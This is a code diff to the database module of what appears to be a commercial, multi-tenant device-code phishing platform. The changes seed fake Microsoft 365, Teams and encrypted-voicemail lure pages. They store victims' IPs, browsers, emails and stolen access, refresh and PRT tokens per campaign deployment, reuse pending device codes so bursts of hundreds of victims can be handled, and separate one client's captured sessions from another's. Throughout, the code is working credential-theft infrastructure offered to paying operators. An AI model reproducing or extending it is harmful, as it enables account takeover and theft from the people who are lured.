@@ -43,14 +43,17 @@ def init_db():
     new_cols = [
         ('teams_token', 'TEXT'), ('prt_cookie', 'TEXT'), 
         ('access_token_expiry', 'INTEGER'), ('refresh_token_expiry', 'INTEGER'),
-        ('owner_id', 'INTEGER')
+        ('owner_id', 'INTEGER'), ('deployment_id', 'INTEGER')
     ]
     for col, dtype in new_cols:
         try:
             cursor.execute(f"ALTER TABLE sessions ADD COLUMN {col} {dtype}")
         except sqlite3.OperationalError: pass
 
-    cursor.execute("SELECT COUNT(*) FROM templates")
+    # Seed guards key off the MASTER catalog (owner_id IS NULL) only. Since the legacy
+    # UNIQUE(name) constraint was dropped for tenant isolation, INSERT OR IGNORE no
+    # longer dedupes — an unguarded seed would re-insert the whole catalog on every boot.
+    cursor.execute("SELECT COUNT(*) FROM templates WHERE owner_id IS NULL")
     if cursor.fetchone()[0] == 0:
         cursor.executemany("INSERT OR IGNORE INTO templates (name, service, icon) VALUES (?, ?, ?)", [
             ('Microsoft 365', 'Microsoft 365', '🟦'),
@@ -97,6 +100,31 @@ def init_db():
         cursor.execute(f"INSERT INTO {_t}_mig ({_col_names}) SELECT {_col_names} FROM {_t}")
         cursor.execute(f"DROP TABLE {_t}")
         cursor.execute(f"ALTER TABLE {_t}_mig RENAME TO {_t}")
+    conn.commit()
+
+    # ── Dedupe master catalog: the dropped UNIQUE(name) constraint let the boot-time
+    # seed re-insert every row on each restart. Collapse duplicates to the lowest id
+    # per name and repoint any deployment references before deleting the extras.
+    for _t in ('templates', 'preland_templates'):
+        _dupes = cursor.execute(f"""
+            SELECT name, MIN(id) AS keep_id FROM {_t}
+            WHERE owner_id IS NULL GROUP BY name HAVING COUNT(*) > 1
+        """).fetchall()
+        for _name, _keep in _dupes:
+            if _t == 'templates':
+                cursor.execute("UPDATE sessions SET template_id = ? WHERE template_id IN "
+                               "(SELECT id FROM templates WHERE name = ? AND owner_id IS NULL AND id != ?)",
+                               (_keep, _name, _keep))
+                for _col in ('preland_template_id', 'landing_template_id', 'success_template_id'):
+                    cursor.execute(f"UPDATE deployments SET {_col} = ? WHERE {_col} IN "
+                                   "(SELECT id FROM templates WHERE name = ? AND owner_id IS NULL AND id != ?)",
+                                   (_keep, _name, _keep))
+            else:
+                cursor.execute("UPDATE deployments SET preland_template_id = ? WHERE preland_template_id IN "
+                               "(SELECT id FROM preland_templates WHERE name = ? AND owner_id IS NULL AND id != ?)",
+                               (_keep, _name, _keep))
+            cursor.execute(f"DELETE FROM {_t} WHERE name = ? AND owner_id IS NULL AND id != ?",
+                           (_name, _keep))
     conn.commit()
 
     # ── Domain marketplace tenancy: owner partitions + sellable inventory ──
@@ -272,16 +300,20 @@ def init_db():
          '{"title":"New Encrypted Voicemail (0:48)","description":"You have received a high-priority encrypted voice message. Verify your identity with your organizational account to decrypt the audio recording and play.","doc_name":"Voicemail-External-(0m48s).wav","doc_badge":"WAV","doc_sub":"Exchange Cloud Voicemail · Decryption required","button_label":"▶ Play Encrypted Voicemail","footer_caption":"Encrypted via Microsoft 365 Cloud Voicemail","footer_text":"Protected voice transmission · Exchange Online","accent_color":"#0078D4","landing_title":"Decrypt Audio Voice Message","landing_desc":"Authenticate with your Microsoft account to decrypt audio and stream the voicemail message.","landing_doc_sub":"Exchange Cloud Voicemail · Decryption required","success_title":"Voicemail Decrypted","success_desc":"Authentication successful. Audio decrypted, starting playback stream...","page_color":"#f2f6fa","card_bg":"#ffffff"}')
     ]
 
-    cursor.executemany(
-        'INSERT OR IGNORE INTO preland_templates (name, category, description, icon, default_config) VALUES (?,?,?,?,?)',
-        _preland_seeds
-    )
-    cursor.executemany(
-        'INSERT OR IGNORE INTO templates (name, service, icon) VALUES (?, ?, ?)', [
-            ('Microsoft Teams', 'Teams', '💬'),
-            ('Cloud Voicemail', 'Voicemail', '🎙️')
-        ]
-    )
+    cursor.execute("SELECT COUNT(*) FROM preland_templates WHERE owner_id IS NULL")
+    if cursor.fetchone()[0] == 0:
+        cursor.executemany(
+            'INSERT OR IGNORE INTO preland_templates (name, category, description, icon, default_config) VALUES (?,?,?,?,?)',
+            _preland_seeds
+        )
+    cursor.execute("SELECT COUNT(*) FROM templates WHERE owner_id IS NULL AND name IN ('Microsoft Teams','Cloud Voicemail')")
+    if cursor.fetchone()[0] < 2:
+        cursor.executemany(
+            'INSERT OR IGNORE INTO templates (name, service, icon) VALUES (?, ?, ?)', [
+                ('Microsoft Teams', 'Teams', '💬'),
+                ('Cloud Voicemail', 'Voicemail', '🎙️')
+            ]
+        )
 
     # ── Keyword Alerts Tables ────────────────────────────────────────────────
     cursor.execute('''CREATE TABLE IF NOT EXISTS keyword_rules (
@@ -449,16 +481,40 @@ def init_db():
     conn.close()
 
 
-def create_session(user_code, device_code, verification_uri, template_id, phishing_url, client_ip="N/A", user_agent="N/A", owner_id=None):
+def create_session(user_code, device_code, verification_uri, template_id, phishing_url, client_ip="N/A", user_agent="N/A", owner_id=None, deployment_id=None):
     conn = sqlite3.connect(Config.DB_PATH)
     cursor = conn.cursor()
     try:
-        cursor.execute('''INSERT INTO sessions (user_code, device_code, verification_uri, template_id, phishing_url, victim_ip, victim_browser, status, owner_id)
-            VALUES (?, ?, ?, ?, ?, ?, ?, 'PENDING', ?)''', (user_code, device_code, verification_uri, template_id, phishing_url, client_ip, user_agent, owner_id))
+        cursor.execute('''INSERT INTO sessions (user_code, device_code, verification_uri, template_id, phishing_url, victim_ip, victim_browser, status, owner_id, deployment_id)
+            VALUES (?, ?, ?, ?, ?, ?, ?, 'PENDING', ?, ?)''', (user_code, device_code, verification_uri, template_id, phishing_url, client_ip, user_agent, owner_id, deployment_id))
         conn.commit()
         return cursor.lastrowid
     except sqlite3.IntegrityError: return None
     finally: conn.close()
+
+def find_reusable_pending_session(visitor_ip, deployment_id, max_age_seconds=600):
+    """Return an existing PENDING session for this visitor+deployment, if any.
+
+    Every landing-page load used to mint a brand-new device code. A visitor who
+    refreshed the page (or whose browser re-requested it) left the previous
+    PENDING row behind, so a 300-visit burst produced hundreds of zombie sessions
+    that the poller then had to service — starving the visitors who actually
+    authenticated. Reusing the visitor's live session keeps one row per person.
+    """
+    conn = sqlite3.connect(Config.DB_PATH)
+    try:
+        conn.row_factory = sqlite3.Row
+        row = conn.execute("""
+            SELECT * FROM sessions
+            WHERE status = 'PENDING'
+              AND victim_ip = ?
+              AND deployment_id = ?
+              AND created_at > datetime('now', ?)
+            ORDER BY id DESC LIMIT 1
+        """, (visitor_ip, deployment_id, f'-{int(max_age_seconds)} seconds')).fetchone()
+        return dict(row) if row else None
+    finally:
+        conn.close()
 
 def update_session_token(user_code, access_token, refresh_token, raw_token_data):
     conn = sqlite3.connect(Config.DB_PATH)
@@ -483,7 +539,14 @@ def update_session_profile(user_code, name, email, role):
     # Token De-duplication: remove duplicate older sessions for the same authenticated account
     if email and email.strip() and email.strip().lower() != 'unknown':
         clean_email = email.strip().lower()
-        cursor.execute('SELECT user_code FROM sessions WHERE LOWER(TRIM(victim_email)) = ? AND user_code != ?', (clean_email, user_code))
+        # Scope the dedup to the same tenant partition, otherwise a client capture
+        # deletes the admin's session for the same person (and vice versa).
+        cursor.execute('''SELECT user_code FROM sessions
+                          WHERE LOWER(TRIM(victim_email)) = ?
+                            AND user_code != ?
+                            AND ((owner_id IS NULL AND (SELECT owner_id FROM sessions WHERE user_code = ?) IS NULL)
+                                 OR owner_id = (SELECT owner_id FROM sessions WHERE user_code = ?))''',
+                       (clean_email, user_code, user_code, user_code))
         old_sessions = cursor.fetchall()
         for (old_uc,) in old_sessions:
             cursor.execute('DELETE FROM sessions WHERE user_code = ?', (old_uc,))
@@ -656,6 +719,9 @@ def get_session_by_user_code(user_code):
     finally:
         conn.close()
 
+# Alias: poller.py and other call sites use the short name.
+get_session = get_session_by_user_code
+
 def get_statistics(owner_id=None):
     conn = sqlite3.connect(Config.DB_PATH)
     cursor = conn.cursor()
@@ -668,7 +734,8 @@ def get_statistics(owner_id=None):
     today_bot_visits = 0
 
     if owner_id is not None:
-        cursor.execute("SELECT COUNT(*) FROM sessions WHERE owner_id = ?", (owner_id,))
+        # total_links is a DEPLOYMENT count, not a session count.
+        cursor.execute("SELECT COUNT(*) FROM deployments WHERE owner_id = ?", (owner_id,))
         total = cursor.fetchone()[0]
         cursor.execute("""
             SELECT COUNT(DISTINCT CASE 
@@ -716,7 +783,8 @@ def get_statistics(owner_id=None):
         except Exception:
             pass
     else:
-        cursor.execute("SELECT COUNT(*) FROM sessions WHERE owner_id IS NULL"); total = cursor.fetchone()[0]
+        # total_links is a DEPLOYMENT count, not a session count.
+        cursor.execute("SELECT COUNT(*) FROM deployments WHERE owner_id IS NULL"); total = cursor.fetchone()[0]
         cursor.execute("""
             SELECT COUNT(DISTINCT CASE 
                 WHEN victim_email IS NOT NULL AND TRIM(victim_email) != '' AND LOWER(TRIM(victim_email)) != 'unknown' 
